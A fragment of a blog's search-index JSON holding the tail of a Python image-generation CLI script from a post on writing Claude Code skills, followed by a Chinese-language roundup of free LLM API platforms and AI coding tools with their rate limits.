class=\"o\"\u003e][\u003c/span\u003e0\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;content\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e][\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;parts\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e _save_images\u003cspan class=\"o\"\u003e(\u003c/span\u003eparts_out, output_dir, \u003cspan class=\"k\"\u003eselect\u003c/span\u003e, output_name, mkdir\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edef main\u003cspan class=\"o\"\u003e()\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eparser\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e argparse.ArgumentParser\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003edescription\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Generate images via SDK or HTTP\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    parser.add_argument\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;prompt\u0026#34;\u003c/span\u003e, \u003cspan class=\"nv\"\u003enargs\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;*\u0026#34;\u003c/span\u003e, \u003cspan class=\"nv\"\u003ehelp\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Image description prompt\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    parser.add_argument\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;--mode\u0026#34;\u003c/span\u003e, \u003cspan class=\"nv\"\u003edefault\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;sdk\u0026#34;\u003c/span\u003e, \u003cspan class=\"nv\"\u003echoices\u003c/span\u003e\u003cspan class=\"o\"\u003e=[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;sdk\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;http\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e])\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    parser.add_argument\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;--aspect-ratio\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;-a\u0026#34;\u003c/span\u003e, \u003cspan class=\"nv\"\u003edefault\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;16:9\u0026#34;\u003c/span\u003e, \u003cspan class=\"nv\"\u003echoices\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eVALID_ASPECT_RATIOS\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    parser.add_argument\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;--resolution\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;-r\u0026#34;\u003c/span\u003e, \u003cspan class=\"nv\"\u003edefault\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;4K\u0026#34;\u003c/span\u003e, \u003cspan class=\"nv\"\u003echoices\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eVALID_RESOLUTIONS\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    parser.add_argument\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;--output-dir\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;-o\u0026#34;\u003c/span\u003e, \u003cspan class=\"nv\"\u003edefault\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;.\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    parser.add_argument\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;--output-name\u0026#34;\u003c/span\u003e, \u003cspan class=\"nv\"\u003edefault\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eNone\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    parser.add_argument\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;--mkdir\u0026#34;\u003c/span\u003e, \u003cspan class=\"nv\"\u003eaction\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;store_true\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    parser.add_argument\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;--input-image\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;-i\u0026#34;\u003c/span\u003e, \u003cspan class=\"nv\"\u003edefault\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eNone\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    parser.add_argument\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;--select\u0026#34;\u003c/span\u003e, \u003cspan class=\"nv\"\u003edefault\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;all\u0026#34;\u003c/span\u003e, \u003cspan class=\"nv\"\u003echoices\u003c/span\u003e\u003cspan class=\"o\"\u003e=[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;all\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;first\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;last\u0026#34;\u003c/span\u003e, \u003cspan class=\"s2\"\u003e\u0026#34;max_res\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e])\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eargs\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e parser.parse_args\u003cspan class=\"o\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e not args.prompt:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        parser.print_help\u003cspan class=\"o\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        sys.exit\u003cspan class=\"o\"\u003e(\u003c/span\u003e1\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eprompt\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34; \u0026#34;\u003c/span\u003e.join\u003cspan class=\"o\"\u003e(\u003c/span\u003eargs.prompt\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e args.mode \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;sdk\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003esaved\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e _sdk_generate\u003cspan class=\"o\"\u003e(\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003eprompt\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eprompt,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003eoutput_dir\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eargs.output_dir,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003easpect_ratio\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eargs.aspect_ratio,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003eresolution\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eargs.resolution,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003einput_image\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eargs.input_image,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003eoutput_name\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eargs.output_name,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003emkdir\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eargs.mkdir,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003eselect\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eargs.select,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003esaved\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e _http_generate\u003cspan class=\"o\"\u003e(\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003eprompt\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eprompt,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003eoutput_dir\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eargs.output_dir,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003easpect_ratio\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eargs.aspect_ratio,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003eresolution\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eargs.resolution,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003einput_image\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eargs.input_image,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003eselect\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eargs.select,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003eoutput_name\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eargs.output_name,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003emkdir\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eargs.mkdir,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e saved:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        print\u003cspan class=\"o\"\u003e(\u003c/span\u003ef\u003cspan class=\"s2\"\u003e\u0026#34;Generated {len(saved)} image(s):\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003efor\u003c/span\u003e f in saved:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            print\u003cspan class=\"o\"\u003e(\u003c/span\u003ef\u003cspan class=\"s2\"\u003e\u0026#34;  - {Path(f).resolve()}\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        print\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;No images were generated.\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        sys.exit\u003cspan class=\"o\"\u003e(\u003c/span\u003e1\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"nv\"\u003e__name__\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;__main__\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    main\u003cspan class=\"o\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e基本用法：\u003c/p\u003e","title":"Claude code的skills编写"},{"content":"现在AI的使用场景越来越多，公益站有时也不稳定，给大家整理一些能提供相对长期稳定大模型api的厂商和平台，作为备用或测试。\n这里主要收集文本大模型，图片视频生成相关的大模型没有专门做整理。\ntldr 国内大模型平台太卷了，免费额度真的很多，如果没有特殊需求，国内的api就够用了。 主力模型推荐: 阿里iflow, 字节火山引擎, 阿里 modelscope 魔搭社区。 免费vibe coding推荐: 腾讯codebuddy, 快手codeflicker, 阿里通义灵码/qwen-code 非稳定渠道 一些平台会不定期推出吸引用户的免费活动，适合用来测试和临时应急。下面列出一些，过期了的就评论下提醒我删掉。\nAI Ping 20251226 限时免费: glm-4.7, minimax-m2.1, deepseek-v3.2, douban-seeddream文生图 模型限制相关说明\nrpm(Requests per minute): 每分钟请求次数 rpd(Requests per day): 每天请求次数 tpm(Tokens per minute): 每分钟输入输出的token数 tpd(Tokens per day): 每天输入输出的token数 Vibe Coding 免费代码工具 国内的 ai coding 太卷了，各家都提供了很大的免费额度 腾讯云代码助手 CodeBuddy, 独立IDE 目前(20251222)免费使用 glm-4.6, deepseek-v3.1-terminus, huyuan-2.0 20251223: 免费提供最新的 glm-4.7 快手 CodeFlicker , 独立IDE 目前(20251222)免费使用 kimi-k2-0905, kat-coder-pro 阿里 通义灵码 , 独立IDE 免费不限量使用 千问系列模型，但不可更换使用其他模型 阿里 qwen-code, cli命令行 free tier\nOpenAI-compatible API, or sign in with Qwen OAuth to get 2,000 free requests/day. rpm 每天 2000 次，免费额度很大 Cline, vscode扩展 / cli命令行 提供多种使用方式，包括vscode里的扩展、独立的cli vscode的模型配置界面长期提供免费模型 20251223免费: minimax-m2, devstral-2512, grok-code-fast, kat-coder-pro Roo Code, vscode扩展 / Cloud Agents 提供多种使用方式，包括vscode里的扩展、云端编程 vscode的模型配置界面长期提供免费模型 Roo Code Cloud Models 20251223免费: MiniMax-M2, Grok Code Fast 1 Kilo Code, vscode扩展 / cli命令行 提供多种使用方式，包括vscode里的扩展、独立的cli vscode的模型配置界面长期提供免费模型 Models 20251223免费: minimax-m2, devstral-2512, kat-coder-pro OpenCode, cli命令行 最近也提供了OpenCode Desktop的使用方式，长期提供免费模型 Zen Models 20251223免费: glm-4.7, Grok Code Fast 1, Big Pickle coding 工具说明 厂商定制的独立IDE一般都不支持使用自己的大模型api/url， 如腾讯CodeBuddy/阿里灵码 cline/roo-code/kilo-code 提供了ui界面可以选择输入自己的模型api/url，使用方便，换模型也方便 open-code/claude-code/codex/qwen-code 这类命令行工具都可以使用自定义模型api/url， 但要自己搜索配置方法折腾下 国内厂商或平台 阿里心流 iflow S级推荐:\n心流开放平台\niflow-cli 是可以免费使用的 vibe coding 工具, 对标 claude code 目前我所知的免费额度最大的平台，不限量，速度也很快\n主要提供的模型: 阿里千问系列模型较多， 还有 Kimi-K2-Instruct-0905, GLM-4.6, DeepSeek-V3.2-Exp, Qwen3-Coder-Plus\n限流\n每个用户最多只能 同时发起一个 请求，超出限制的请求会返回429错误码。 iflow社区反馈 api 可用的模型很久没更新了，官方似乎准备将更多资源投入iflow-cli,\niflow-cli支持最新的 glm-4.7 / minimax-m2.1 通过开源转换工具如 CLIProxyAPI 可以将 iflow-cli 的免费模型转换成类似公益站的api， 需要折腾一下，不过渠道真的很稳 字节火山方舟大模型 目前 每个模型 每天免费 250w token， 速度很快，体验很好，但单模型token不够用，经常切换模型我觉得麻烦 主要提供的模型: 豆包系列模型较多，最新的deepseek-v3.2, Kimi-K2-Instruct-0905 还提供文生图相关模型 免费推理额度 rpm/tpm各模型不同，一般rpm为1000～10000， tpm为500w 阿里 modelscope 魔搭社区 每天允许进行 总数为 2000 次 的API-Inference调用，其中每单个模型不超过 500 次，具体每个模型的限制可能随时动态调整。 我不太喜欢阿里的modelscope， 受欢迎的模型总是开放一段时间就下架，但提供的免费额度很稳定，千问系列模型很稳定 还提供文生图相关模型 限制 在每个模型每天不超过 500 次调用的基础上，平台可能对于部分模型再进行单独的限制，例如，deepseek-ai/DeepSeek-R1-0528，deepseek-ai/DeepSeek-V3.1等规格较大模型，当前限制 单模型每天200次 调用额度。 -在上述调用次数限制的基础上，不同模型允许的调用并发，会根据平台的压力进行动态的速率限制调整，原则上以保障开发者单并发正常使用为目标 快手 KAT-Coder 系列模型 KAT-Coder-Pro V1 和 KAT-Coder-Air 目前都提供免费使用，其中 KAT-Coder-Air 长期提供免费使用 我经常拿来做测试，速度很快，对结果要求不高可以试试 KAT-Coder-Air V1 模型免费使用规则 高峰时段: 08:00-02:00（次日）, 每6小时内您将可以发起 120次 对话请求。 非高峰时段: 02:00-08:00, 每6小时内您将可以发起 200次 对话请求 智谱 glm flash 系列模型 智谱AI开放平台 福利专区 少数的模型厂商自己提供免费模型api，长期稳定，免费的都是小模型，但种类比较全 速度很快，但效果不好，适合用来测试 模型包括: GLM-4-Flash-250414, GLM-4.1V-Thinking-Flash, Cogview-3-Flash(文生图), CogVideoX-Flash(视频生成) 速率限制 限制的维度是请求 并发 数量（在途请求任务数量）， GLM-4-Flash为200, GLM-4V-Flash为10 硅基流动 SiliconFlow 长期稳定提供免费的小模型，大多7b/8b/9b的小模型，速度快 不提供32b以上的免费模型，小模型质量较差，我平时用的少 Rate Limits 大多都是 tpm-50k 国内 Others 上面都是我用的比较多的，下面是一些其他免费模型，大家也可以补充 美团 LongCat 系列模型 LongCat API开放平台 每个账号每天自动获得 500,000 Tokens 免费额度 单次请求限制 输出文本：最大8K Tokens， 当触发限流时，API将返回HTTP状态码429 特别提及: 七牛 AI 大模型推理服务 这是我所知的国内仅有的大模型平台，官方能提供 OpenAI/Claude/Gemini 模型，不知道是不是 2API 的渠道 官方提供300w免费token, 有效期一年， 速度很快，强烈推荐，能用各种模型 AI 大模型推理服务 - 七牛云 国外厂商或平台 显卡一哥英伟达老黄的福利 - Nvidia NIM API 我觉得比openrouter更好用，似乎免费不限量 提供各种模型， 包括国外的模型: deepseek-v3.2, qwen3-coder-480b, kimi-k2-thinking, minimax-m2, mistral-large, devstral 不支持: glm-4.6/4.7, minimax-m2.1 还支持部分文生图模型, FLUX.1-dev免费 25 requests, 可以试试 Try NVIDIA NIM APIs 限制 rpm: 40 Cerebras Inference 我体验过的速度最快的大模型平台，速度可达 220+ token/s, S级推荐 提供的免费模型较少，经常更换，现在包括: glm-4.6, qwen-3-235b-a22b-instruct-2507, gpt-oss-120b, … Rate Limits RPM: 10~30 TPD: 1M , 每天 100w token 有点不够用，但爽就完事了 OpenRouter 长期稳定，模型丰富 API Rate Limits 不充钱的用户每天 50 rpd, 充了10刀的用户每天 1000 rpd 很多公益站都用了 OpenRouter 的渠道 Mistral 欧洲主流模型厂商，提供长期稳定的模型api 我试过在官方聊天网站 Le Chat 体验的效果很差，远不如国内的模型， 我还试过在本地用 Ollama / LM Studio 跑 mistral/devstral 系列的模型也远不如国内的qwen3-32b内的模型，但reddit论坛很多人都在吹mistral系列的模型，我觉得就是老欧人的自嗨 Rate Limits \u0026amp; Usage tiers 免费额度非常大， Tokens per Minute 500,000 Tokens per Month 1,000,000,000，大约每天 rpd 是 3300w Codestral mistral系列专注于coding的模型似乎有额外的免费额度，但我没用过，因为coding模型竞争太激烈了，有其他选择 国外 Others groq 免费模型种类多，但大模型不多，大多是小模型， 免费额度较少 免费大模型包括: kimi-k2-instruct-0905, gpt-oss-120b, llama-4-maverick-17b-128e Rate Limits rpm - 10~60 tokens per day 是 100K~500K, 每天的token太少了，不够用 Poe poe 既不是模型研发厂商，也不是聚合平台，主要业务是方便用户通过ui创建chat-bot和自动化任务bot，也提供了模型api供用户使用\n免费用户每天发放 3000 points, 仅当日有效\nPoe FAQs 官方文档提到了支持 claude-code, cline, cursor, continue\n佬友 tips: 用之前建议一个个模型按费率和收费标准选一下，像 Grok-4.1-Fast 、Gemini Flash 系列、GPT-5-mini/GPT-5-nano 都不怎么耗积分\n我个人不推荐使用这家的api， 因为不支持结构化输出，这是ai非聊天类工具大多需要的基础功能\nStructured outputs are not supported The strict parameter for function calling is ignored, which means the tool use JSON is not guaranteed to follow the supplied schema. OpenAI Compatible API Chutes 目前限时免费的模型有4个: GLM 4.5 Air, Gpt Oss 20b, Gemma 3 4b, Tongyi DeepResearch 30B 免费的模型参数不够大，不如其他平台 Chutes Free Models 目前测试注册就可以用，不需要充钱，只写了限时免费，没找到请求速度限制说明 不推荐使用这个平台，因为免费规则经常调整，在25年7月需要充5刀了才给200rpd免费额度 ZenMux 目前提供了4个免费模型: gemini-3-flash-preview-free, xiaomi/mimo-v2-flash, kuaishou/kat-coder-pro-v1, z-ai/glm-4.6v-flash Free Models - ZenMux 测试时gemini-3-flash返回异常429, xiaomi-mino能用但速度一般 这个平台我看25年8月才开始运营，是不是长期稳定还要让子弹飞一会儿，以后会关注更新 Huggingface 国外平台我用的少，大家可以补充一些反馈和其他平台 其他 这么多免费大模型api，不知道有没有什么好的统一管理的方法 ","permalink":"https://rendoumi.com/posts/20251231-ai_models/","summary":"\u003cp\u003e现在AI的使用场景越来越多，公益站有时也不稳定，给大家整理一些能提供相对长期稳定大模型api的厂商和平台，作为备用或测试。\u003c/p\u003e\n\u003cp\u003e这里主要收集文本大模型，图片视频生成相关的大模型没有专门做整理。\u003c/p\u003e\n\u003ch2 id=\"tldr\"\u003e\u003cstrong\u003etldr\u003c/strong\u003e\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e国内大模型平台太卷了，免费额度真的很多，如果没有特殊需求，国内的api就够用了。\u003c/li\u003e\n\u003cli\u003e主力模型推荐: 阿里iflow, 字节火山引擎, 阿里 modelscope 魔搭社区。\u003c/li\u003e\n\u003cli\u003e免费vibe coding推荐: 腾讯codebuddy,  快手codeflicker, 阿里通义灵码/qwen-code\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"非稳定渠道\"\u003e非稳定渠道\u003c/h2\u003e\n\u003cp\u003e一些平台会不定期推出吸引用户的免费活动，适合用来测试和临时应急。下面列出一些，过期了的就评论下提醒我删掉。\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eAI Ping\n\u003cul\u003e\n\u003cli\u003e20251226 限时免费: \u003cstrong\u003eglm-4.7\u003c/strong\u003e, \u003cstrong\u003eminimax-m2.1\u003c/strong\u003e, deepseek-v3.2, douban-seeddream文生图\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp\u003e模型限制相关说明\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003erpm(Requests per minute): 每分钟请求次数\u003c/li\u003e\n\u003cli\u003erpd(Requests per day): 每天请求次数\u003c/li\u003e\n\u003cli\u003etpm(Tokens per minute): 每分钟输入输出的token数\u003c/li\u003e\n\u003cli\u003etpd(Tokens per day): 每天输入输出的token数\u003c/li\u003e\n\u003c/ul\u003e\u003c/blockquote\u003e\n\u003ch2 id=\"vibe-coding-免费代码工具\"\u003eVibe Coding 免费代码工具\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e国内的 ai coding 太卷了，各家都提供了很大的免费额度\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"腾讯云代码助手-codebuddy-独立ide\"\u003e\u003ca href=\"https://copilot.tencent.com/ide/\"\u003e腾讯云代码助手 CodeBuddy\u003c/a\u003e, 独立IDE\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e目前(20251222)免费使用 glm-4.6, deepseek-v3.1-terminus, huyuan-2.0\n\u003cul\u003e\n\u003cli\u003e20251223: 免费提供最新的 \u003cstrong\u003eglm-4.7\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"快手-codeflicker--独立ide\"\u003e快手 \u003ca 